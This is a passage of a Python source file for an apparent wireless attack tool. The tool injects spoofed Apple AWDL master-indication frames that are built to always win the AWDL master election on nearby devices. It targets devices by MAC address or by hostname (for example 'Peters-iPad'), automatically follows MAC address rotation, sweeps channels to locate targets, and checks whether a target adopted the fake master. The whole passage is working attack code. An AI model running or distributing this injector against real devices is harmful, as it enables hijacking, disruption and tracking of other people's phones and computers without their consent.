            src, hostname, _maddr, _sctr = info
            if bytes(src) in target_set or \
                    (hostname is not None and hostname.lower() in name_set):
                n += 1
        counts[ch] = n
        print("    channel %3d: %d AWDL frame(s) from target(s)" % (ch, n))
    if not counts or max(counts.values()) == 0:
        return None
    return max(counts, key=counts.get)


DEVCLASS_NAMES = {
    "macos": AWDL_DEVCLASS_MACOS,
    "ios": AWDL_DEVCLASS_IOS,
    "tvos": AWDL_DEVCLASS_TVOS,
}


def prepare_stick(ifname, regdomain="US", channel=None):
    """Prepare the Wi-Fi stick for injection via ``awdl_prepare_stick.sh``.

    The companion shell script (shipped next to this file) forces a clean,
    plain monitor interface -- dropping any stale "active" monitor flag that
    destabilises USB adapters such as the mt76x0u -- and sets a regulatory
    domain that permits the 5 GHz AWDL channels.  Returns True on success.
    """
    script = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                          "awdl_prepare_stick.sh")
    if not os.path.exists(script):
        print("[!] setup: %s not found; cannot prepare the stick" % script)
        return False
    # The script takes positional args: <iface> [channel] [regdomain]. Pass an
    # empty channel placeholder when we do not know it yet (the tool tunes the
    # channel itself afterwards), so the regdomain still lands in the 3rd slot.
    cmd = ["sh", script, ifname, "" if channel is None else str(channel), regdomain]
    print("[*] preparing %s (plain monitor, regdomain %s)" % (ifname, regdomain))
    try:
        subprocess.run(cmd, check=True)
        return True
    except subprocess.CalledProcessError as exc:
        print("[!] setup failed (exit %d)" % exc.returncode)
        return False


def run_injection(sock, store, builder, ifname, interval=1.0, duration=0,
                  count=0, psf=False, watch=False, rotate_channels=None,
                  channel_dwell=CHANNEL_DWELL_DEFAULT,
                  counter_step=MASTER_COUNTER_STEP, stop=None, tracker=None):
    """Inject AWDL MIF frames, reading every live parameter from ``store``.

    This is the reusable core of the tool.  Before building each frame it pulls
    a fresh snapshot from the :class:`ParamStore`, so other code can change the
    targets, source, counter, channel, ... between sends just by mutating the
    store.  One frame is sent to each MAC in ``targets`` per cycle.  ``main``
    uses it for the CLI; an integrator can call it directly::

        stop = threading.Event()
        threading.Thread(target=run_injection,
                         args=(sock, store, builder, "wlan0"),
                         kwargs=dict(interval=0.11, stop=stop)).start()
        store.update(targets=[parse_mac("66:aa:30:33:93:af")])  # live change
        stop.set()                                              # and stop

    Arguments:
        sock            raw injection socket from ``open_injection_socket``
        store           the :class:`ParamStore` to read parameters from
        builder         an :class:`AwdlFrameBuilder` (holds the static timing
                        fields; its live fields are overwritten each cycle)
        ifname          interface name, used to re-tune the radio on channel
                        changes / rotation
        rotate_channels optional list of channels to rotate across; when it has
                        more than one entry the rotation owns the channel and
                        the active channel is written back into the store
        stop            optional ``threading.Event``; set it to end the loop
        tracker         optional :class:`HostnameTracker`; when given, received
                        frames are fed to it so it can follow MAC rotations and
                        update ``store``'s ``targets`` automatically

    Returns the ``(sent, dropped)`` frame counts.
    """
    if stop is None:
        stop = threading.Event()
    rotate_channels = list(rotate_channels) if rotate_channels else []
    multi = len(rotate_channels) > 1

    watch_state = {}
    last_report = time.monotonic()
    start = time.monotonic()
    deadline = start + duration if duration > 0 else None
    sent = dropped = 0
    ci = 0
    current_channel = None
    next_switch = time.monotonic() + channel_dwell

    while not stop.is_set():
        # Advance the channel rotation once the dwell on the current one is up.
        if multi and time.monotonic() >= next_switch:
            ci = (ci + 1) % len(rotate_channels)
            next_switch = time.monotonic() + channel_dwell

        snap = store.snapshot()

        # Re-tune the radio when the desired channel changes. In rotation mode
        # the rotation owns the channel (and the active one is reflected back
        # into the store); otherwise the store's channel wins.
        desired = rotate_channels[ci] if multi else snap["channel"]
        if desired != current_channel:
            set_channel(ifname, desired)
            current_channel = desired
            if multi:
                store.update(channel=desired)

        apply_snapshot(builder, snap)
        builder.channel = current_channel

        # Send one frame to each target this cycle (same master identity and
        # election parameters, just a different destination MAC per frame).
        for dst in snap["targets"]:
            builder.dst = dst
            if send_frame(sock, builder.build(AWDL_ACTION_MIF)):
                sent += 1
            else:
                dropped += 1
            if psf:
                if send_frame(sock, builder.build(AWDL_ACTION_PSF)):
                    sent += 1
                else:
                    dropped += 1

        # keep the master "live": advance the counter so it is never stale
        store.advance_counter(counter_step, UINT32_MAX)

        if watch or tracker is not None:
            changes = poll_rx(sock, snap["source"],
                              watch_state if watch else None, tracker)
            for hostname, old, new in changes:
                if old is None:
                    print("    [track] %s -> %s" % (hostname, mac_str(new)))
                else:
                    print("    [track] %s rotated %s -> %s"
                          % (hostname, mac_str(old), mac_str(new)))
            if watch:
                now = time.monotonic()
                if now - last_report >= 1.0:
                    watch_report(watch_state, mac_str(snap["source"]))
                    last_report = now

        if count and sent >= count:
            break
        if interval <= 0:
            break
        if deadline is not None and time.monotonic() >= deadline:
            break

        # sleep in small slices so the stop flag, the deadline and the channel
        # switch all stay responsive
        slept = 0.0
        while slept < interval and not stop.is_set():
            if deadline is not None and time.monotonic() >= deadline:
                break
            if multi and time.monotonic() >= next_switch:
                break
            step = min(0.1, interval - slept)
            time.sleep(step)
            slept += step

    return sent, dropped


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Inject AWDL MIF frames that guarantee winning the election "
                    "(become AWDL master), directed at a specific MAC address.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("-i", "--interface", required=True,
                        help="monitor-mode Wi-Fi interface to inject on")
    parser.add_argument("-t", "--target", type=parse_macs, default=None,
                        action="append", metavar="MAC[,MAC...]",
                        help="destination MAC address(es) the frames are directed "
                             "at; give several comma-separated and/or repeat -t "
                             "(one frame is sent to each per cycle). Use "
                             "ff:ff:ff:ff:ff:ff to broadcast. Required unless "
                             "--track is given")
    parser.add_argument("--track", type=parse_names, default=None,
                        action="append", metavar="NAME[,NAME...]",
                        help="AWDL hostname(s) to follow (e.g. \"Peters-iPad\"); "
                             "the tool sniffs, resolves each to the device's "
                             "current MAC and re-targets automatically as the "
                             "MAC rotates -- so you never re-enter a rotated MAC. "
                             "Comma-separated and/or repeatable; combinable with -t")
    parser.add_argument("-s", "--source", type=parse_mac, default=None,
                        help="source MAC / master identity to advertise "
                             "(default: interface MAC, else random local MAC)")
    parser.add_argument("-c", "--channel", type=int, default=None,
                        choices=sorted(CHAN_OPCLASS),
                        help="single AWDL social channel; if omitted (and no "
                             "--channels), the channel is detected by sweeping "
                             "for the target's frames")
    parser.add_argument("--channels", type=parse_channels, default=None,
                        metavar="LIST",
                        help="comma-separated social channels to rotate "
                             "injection across, e.g. 6,44,149 (covers a target "
                             "that hops channels); overrides -c/--channel")
    parser.add_argument("--channel-dwell", type=parse_duration,
                        default=CHANNEL_DWELL_DEFAULT, metavar="TIME",
                        help="time injected on each channel per rotation when "
                             "--channels is used (s/ms/us/tu suffix; default 1s)")
    parser.add_argument("--sweep-dwell", type=float, default=SWEEP_DWELL_DEFAULT,
                        metavar="SECONDS",
                        help="listen time per channel during channel detection")
    parser.add_argument("--metric", type=lambda x: int(x, 0), default=UINT32_MAX,
                        help="election master metric (default: 0xffffffff = max)")
    parser.add_argument("--counter", type=lambda x: int(x, 0),
                        default=MASTER_COUNTER_BASE,
                        help="starting election master counter; advances every "
                             "frame so the master stays live (default 0x40000000)")
    parser.add_argument("--awdl-version", type=parse_awdl_version,
                        default=AWDL_VERSION_TLV_DEFAULT, metavar="VER",
                        help="AWDL version advertised in the Version TLV, e.g. "
                             "10.0 (default). Newer iOS/iPadOS rejects a master "
                             "advertising an old version, so 10.x is required")
    parser.add_argument("--hostname", default="owl-master",
                        help="hostname advertised in the Arpa TLV")
    parser.add_argument("--devclass", choices=sorted(DEVCLASS_NAMES),
                        default="macos", help="advertised device class")
    parser.add_argument("--count", type=int, default=0,
                        help="number of frames to send (0 = until interrupted)")

    timing = parser.add_argument_group(
        "timing", "control the send cadence and the AWDL timing parameters "
                  "advertised in the Sync Parameters TLV")
    timing.add_argument("--interval", type=parse_duration, default=1.0,
                        metavar="TIME",
                        help="time between send cycles; accepts an s/ms/us/tu "
                             "suffix (e.g. 0.5, 500ms, 110tu). 0 = send once")
    timing.add_argument("--duration", type=parse_duration, default=0,
                        metavar="TIME",
                        help="stop after this much time (same unit suffixes; "
                             "0 = run until --count or Ctrl-C)")
    timing.add_argument("--aw-period", type=int, default=AW_PERIOD_TU,
                        metavar="TU",
                        help="advertised Availability Window period in TU")
    timing.add_argument("--af-period", type=int, default=PSF_INTERVAL_MASTER_TU,
                        metavar="TU",
                        help="advertised action-frame (PSF) period in TU")
    timing.add_argument("--presence-mode", type=int, default=PRESENCE_MODE,
                        metavar="N",
                        help="advertised presence mode / EAW multiplier; values "
                             "other than 4 may be rejected by OWL peers")
    timing.add_argument("--aw-offset", type=int, default=0, metavar="TU",
                        help="availability-window phase offset in TU (1 TU = "
                             "1024 us, 1 AW = --aw-period TU); may be negative. "
                             "Shifts the AW schedule peers synchronise to")
    parser.add_argument("--psf", action="store_true",
                        help="also interleave PSF frames (default: MIF only)")
    parser.add_argument("--watch", action="store_true",
                        help="while injecting, also listen on the same card and "
                             "report which master each AWDL peer advertises "
                             "(shows whether the target adopted you)")
    parser.add_argument("--setup", action="store_true",
                        help="prepare the Wi-Fi stick first: force a clean plain "
                             "monitor interface and set the regulatory domain "
                             "(runs awdl_prepare_stick.sh; needs root)")
    parser.add_argument("--regdomain", default="US", metavar="CC",
                        help="ISO country code for the regulatory domain applied "
                             "by --setup (default: US, needed for 5 GHz 44/149)")
    parser.add_argument("--dry-run", action="store_true",
                        help="build and hex-dump one frame without injecting")
    args = parser.parse_args(argv)

    # Validate the timing parameters (they must fit the on-wire fields).
    if not 1 <= args.presence_mode <= 16:
        parser.error("--presence-mode must be between 1 and 16")
    if not 1 <= args.aw_period <= 0xFFFF:
        parser.error("--aw-period must be between 1 and 65535 TU")
    if not 1 <= args.af_period <= 0xFFFF:
        parser.error("--af-period must be between 1 and 65535 TU")

    src = args.source
    if src is None:
        src = get_iface_mac(args.interface) or random_local_mac()

    # Flatten -t / --track (each accepts comma-separated lists and may be
    # repeated, so argparse hands us a list of lists). Dedupe, keeping order.
    fixed_targets = []
    for group in (args.target or []):
        for mac in group:
            if mac not in fixed_targets:
                fixed_targets.append(mac)
    track_names = []
    for group in (args.track or []):
        for name in group:
            if name not in track_names:
                track_names.append(name)
    if not fixed_targets and not track_names:
        parser.error("give at least one -t/--target MAC or --track hostname")

    metric = args.metric & UINT32_MAX
    counter = args.counter & UINT32_MAX

    # Decide which channel(s) to inject on:
    #   --channels  -> rotate across the given list
    #   -c/--channel-> single channel
    #   neither     -> detect a single channel by sweeping for the target
    if args.channels:
        channel_list = list(args.channels)
    elif args.channel is not None:
        channel_list = [args.channel]
    else:
        channel_list = None

    sock = None
    if args.dry_run:
        channel = channel_list[0] if channel_list else 44
        if channel_list is None:
            print("# note: no channel given; using channel %d for --dry-run "
                  "(detection needs a live radio)" % channel)
    else:
        if args.setup:
            setup_channel = channel_list[0] if channel_list else None
            if not prepare_stick(args.interface, args.regdomain, setup_channel):
                sys.exit("error: could not prepare interface %s" % args.interface)
        sock = open_injection_socket(args.interface)
        have_iw = shutil.which("iw") is not None
        if channel_list is None:
            if not have_iw:
                sock.close()
                sys.exit("error: 'iw' is required to detect the channel; "
                         "install it or pass -c/--channel/--channels")
            channel = sweep_for_channel(sock, args.interface, fixed_targets,
                                        track_names, AWDL_SOCIAL_CHANNELS,
                                        args.sweep_dwell)
            if channel is None:
                sock.close()
                sys.exit("error: target(s) %s not seen on any AWDL channel; "
                         "pass -c/--channel to set it manually"
                         % ", ".join([mac_str(t) for t in fixed_targets]
                                     + track_names))
            print("[*] detected target on channel %d" % channel)
            channel_list = [channel]
            if not set_channel(args.interface, channel):
                sock.close()
                sys.exit("error: could not tune interface to channel %d" % channel)
        else:
            channel = channel_list[0]
            if have_iw:
                set_channel(args.interface, channel)  # best-effort; may be tuned already
            else:
                print("[*] 'iw' not found; assuming %s is already on channel %d"
                      % (args.interface, channel))

    builder = AwdlFrameBuilder(
        src=src, dst=(fixed_targets[0] if fixed_targets else BROADCAST),
        channel=channel,
        master_metric=metric, master_counter=counter,
        self_metric=metric, self_counter=counter,
        hostname=args.hostname, devclass=DEVCLASS_NAMES[args.devclass],
        aw_period=args.aw_period, af_period=args.af_period,
        presence_mode=args.presence_mode, aw_offset=args.aw_offset,
        awdl_version=args.awdl_version,
    )

    if args.dry_run:
        print("# source (master) : %s" % mac_str(src))
        print("# target(s) (dst) : %s"
              % (", ".join(mac_str(t) for t in fixed_targets) or "(none fixed)"))
        if track_names:
            print("# tracking hostnames: %s" % ", ".join(track_names))
        print("# channel         : %d" % channel)
        print("# election counter : 0x%08x" % counter)
        print("# election metric  : 0x%08x" % metric)
        print("# awdl version     : %d.%d"
              % ((args.awdl_version >> 4) & 0xF, args.awdl_version & 0xF))
        print("# aw/af period     : %d / %d TU" % (args.aw_period, args.af_period))
        print("# presence mode    : %d" % args.presence_mode)
        print("# aw offset        : %d TU" % args.aw_offset)
        frame = builder.build(AWDL_ACTION_MIF)
        print("# MIF frame length : %d bytes" % len(frame))
        print(frame.hex())
        return 0

    # sock was opened above while resolving the channel.
    rotate_channels = channel_list
    multi = len(rotate_channels) > 1

    # The live parameter store ("Zwischenspeicher"): the injection loop reads a
    # fresh snapshot from it before every frame, so other code can change these
    # values at runtime. The CLI just seeds it from the parsed arguments.
    store = ParamStore(
        targets=list(fixed_targets), source=src, channel=channel,
        master_metric=metric, master_counter=counter,
        self_metric=metric, self_counter=counter,
        awdl_version=args.awdl_version, hostname=args.hostname,
        devclass=DEVCLASS_NAMES[args.devclass], aw_offset=args.aw_offset,
    )

    # When hostnames are tracked, the tracker resolves them to current MACs and
    # keeps store["targets"] = fixed + resolved up to date as the MACs rotate.
    tracker = None
    if track_names:
        tracker = HostnameTracker(store, fixed=fixed_targets, names=track_names)

    # graceful Ctrl+C -> set the stop event the loop polls
    stop = threading.Event()
    signal.signal(signal.SIGINT, lambda *_: stop.set())

    chan_str = ",".join(str(c) for c in rotate_channels)
    print("[*] injecting AWDL MIF on %s (ch %s)" % (args.interface, chan_str))
    print("    master   : %s  (counter=0x%08x metric=0x%08x awdl=%d.%d)"
          % (mac_str(src), counter, metric,
             (args.awdl_version >> 4) & 0xF, args.awdl_version & 0xF))
    if fixed_targets:
        print("    directed at: %s" % ", ".join(mac_str(t) for t in fixed_targets))
    if track_names:
        print("    tracking : %s (resolving to current MAC, follows rotation)"
              % ", ".join(track_names))
    print("    timing   : interval=%s aw=%dTU af=%dTU presence=%d offset=%dTU%s"
          % ("once" if args.interval <= 0 else "%gms" % (args.interval * 1000),
             args.aw_period, args.af_period, args.presence_mode, args.aw_offset,
             "" if args.duration <= 0 else " duration=%gs" % args.duration))
    if multi:
        print("    channels : rotating %s (%gs dwell each)"
              % (chan_str, args.channel_dwell))
    if args.watch:
        print("    watching   : reporting each AWDL peer's advertised master")
    print("    (Ctrl-C to stop)")

    try:
        sent, dropped = run_injection(
            sock, store, builder, args.interface,
            interval=args.interval, duration=args.duration, count=args.count,
            psf=args.psf, watch=args.watch, rotate_channels=rotate_channels,
            channel_dwell=args.channel_dwell, stop=stop, tracker=tracker,
        )
    finally:
        sock.close()

    msg = "\n[*] done, sent %d frame(s)" % sent
    if dropped:
        msg += " (%d dropped after TX-queue retries)" % dropped
    print(msg)
    return 0


if __name__ == "__main__":
    sys.exit(main())
